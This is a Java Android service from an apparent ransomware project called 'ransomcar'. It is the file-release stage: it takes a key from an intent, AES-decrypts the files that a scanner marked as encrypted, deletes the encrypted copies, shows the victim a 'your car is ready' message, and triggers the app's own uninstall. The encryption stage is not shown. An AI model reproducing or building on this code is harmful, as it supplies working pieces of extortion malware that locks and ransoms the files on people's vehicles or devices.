package com.example.ransomcar;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.ArrayList;
import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.spec.SecretKeySpec;
import android.app.Service;
import android.content.Intent;
import android.net.Uri;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

public class DecryptData extends Service {
	int mStartMode;       // indicates how to behave if the service is killed
    IBinder mBinder;      // interface for clients that bind
    boolean mAllowRebind; // indicates whether onRebind should be used


@Override
public IBinder onBind(Intent intent) {
	// TODO Auto-generated method stub
	//Log.d("start service", "start");
	return null;
}

@Override
public void onCreate() {
    
	}
	
@Override
public int onStartCommand(Intent intent, int flags, int startId) {

		Log.d("Inside decryption", "starting");
		Toast.makeText(getBaseContext(), "Your car is ready to go in a minute. Please be patience!", Toast.LENGTH_LONG).show();
		// Retrieving encryption key
		final String key = intent.getStringExtra("key");
		
		Thread thread = new Thread() {
		    @Override
		    public void run() {
			    	
			// Get all encrypted files   	
			ArrayList<String> files = ScanSDCard.getListOfEncryptedFiles(); 
			String myKey = key;//get key for decryption

			for (String fileName:files){
				try{ // Decryption mechanism
					Log.d("Decrypting files", " File decrypted: " + fileName);
					FileInputStream fis = new FileInputStream(fileName);
					FileOutputStream fos = new FileOutputStream(fileName.substring(0, fileName.length() - 8));					
					SecretKeySpec sks = new SecretKeySpec(myKey.getBytes(), "AES");
					Cipher cipher = Cipher.getInstance("AES");
					cipher.init(Cipher.DECRYPT_MODE, sks);
					CipherInputStream cis = new CipherInputStream(fis, cipher);
					int b;
					byte[] d = new byte[8];//generate the decrypted file
					while((b = cis.read(d)) != -1) {
						fos.write(d, 0, b);
					}
					
					// delete the encrypted file
					Log.d("Deleting files", " File deleted: " + fileName);
					File f = new File(fileName);
					f.delete();
					
					//close the streams
					fos.flush();
					fos.close();
					cis.close();
					
					}
				catch (Exception e) {
					continue;
				}
			}
			//Start uninstall
			Log.d("Uninstalling the app", "starting");
			Intent uninstall = new Intent(Intent.ACTION_DELETE);
			uninstall.setData(Uri.parse("package:com.example.ransomcar"));
			uninstall.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			startActivity(uninstall);
	    	}
	   	} ;
	   thread.start();

    return mStartMode;
	}
}